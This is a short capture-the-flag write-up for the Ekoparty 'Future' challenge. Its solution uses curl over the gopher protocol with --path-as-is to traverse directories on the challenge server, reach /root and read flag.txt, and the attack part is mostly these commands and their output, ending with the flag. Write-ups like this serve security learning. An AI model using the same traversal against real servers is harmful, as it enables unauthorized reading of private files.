# Future

## Description

![future-1](/assets/ctf/ekoparty/future-1.png)

<http://go.ctf.site:10070/>

## Solution

The description mentions root and by the time I started solving it already had a hint. This cannot be solved by http protocol, gopher is required to be used.

Simple path traversal:

```bash
└─$ curl gopher://go.ctf.site:10070/0/../ --path-as-is 
1backups	/../backups	go.ctf.site	10070	+
1cache	/../cache	go.ctf.site	10070	+
1gopher	/../gopher	go.ctf.site	10070	+
1local	/../local	go.ctf.site	10070	+
1lock	/../lock	go.ctf.site	10070	+
1log	/../log	go.ctf.site	10070	+
1mail	/../mail	go.ctf.site	10070	+
1opt	/../opt	go.ctf.site	10070	+
1run	/../run	go.ctf.site	10070	+
1spool	/../spool	go.ctf.site	10070	+
1tmp	/../tmp	go.ctf.site	10070	+
```

Going deeper:

```bash
└─$ curl gopher://go.ctf.site:10070/0/../../ --path-as-is
3'/../../var' does not exist (no handler found)		error.host	1
```

Check root directory access:

```bash
└─$ curl gopher://go.ctf.site:10070/0/../../root --path-as-is
0flag	/../../root/flag.txt	go.ctf.site	10070	+

└─$ curl gopher://go.ctf.site:10070/0/../../root/flag.txt --path-as-is
EKO{r00t_was_pwn3d!}
```
::: tip Flag
`EKO{r00t_was_pwn3d!}`
:::